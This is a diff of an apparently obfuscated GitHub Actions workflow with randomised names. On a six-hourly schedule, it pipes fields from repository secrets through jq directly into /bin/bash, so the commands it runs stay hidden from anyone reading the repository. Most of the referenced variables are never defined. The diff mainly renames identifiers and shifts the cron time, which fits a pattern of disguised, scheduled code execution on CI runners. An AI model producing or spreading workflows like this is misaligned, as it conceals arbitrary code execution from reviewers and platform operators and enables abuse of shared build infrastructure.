@@ -1,9 +1,9 @@
 name: shenerpin0987
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 4/6 * * *'
-
+    - cron: '55 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: shenerpin0987
         env:
-          ab8306: ${{ secrets.ab8306 }}
+          equ39413: ${{ secrets.equ39413 }}
         run: |
-          echo $ab8306 | jq -r .thplf97153 | /bin/bash
-          echo $gwm4081 | jq -r .uobok14643 | /bin/bash
-          echo $xoz14674 | jq -r .gxi3303 | /bin/bash
-          echo $iscad1567 | jq -r .us8821 | /bin/bash
-          echo $wjro639 | jq -r .oaoz28 | /bin/bash
-          echo $f33209 | jq -r .hm17 | /bin/bash
-          echo $ohg973 | jq -r .lpv255 | /bin/bash
-          echo $i63610 | jq -r .hknuc6009 | /bin/bash
-          echo $iogw736 | jq -r .wv695 | /bin/bash
-          echo $hvjpn656 | jq -r .gx19 | /bin/bash
-          echo $xywi47663 | jq -r .ikka7 | /bin/bash
+          echo $equ39413 | jq -r .ole93 | /bin/bash
+          echo $fma9 | jq -r .o1223 | /bin/bash
+          echo $kleo7 | jq -r .oaro1 | /bin/bash
+          echo $rgy05 | jq -r .bgmy12101 | /bin/bash
+          echo $efsdc8144 | jq -r .c69088 | /bin/bash
+          echo $j81269 | jq -r .cp613 | /bin/bash
+          echo $dw93 | jq -r .pvv996 | /bin/bash
+          echo $ptqll0 | jq -r .eiod8 | /bin/bash
+          echo $bg005 | jq -r .cjnk5750 | /bin/bash
+          echo $mvgo05 | jq -r .tut96 | /bin/bash
+          echo $dy4 | jq -r .bbq003 | /bin/bash
+          echo $ugf5 | jq -r .jj1 | /bin/bash
+          echo $any8046 | jq -r .dgeyw7195 | /bin/bash
+          echo $wrgn6236 | jq -r .seujq237 | /bin/bash
+          echo $vg8965 | jq -r .clod10 | /bin/bash
 
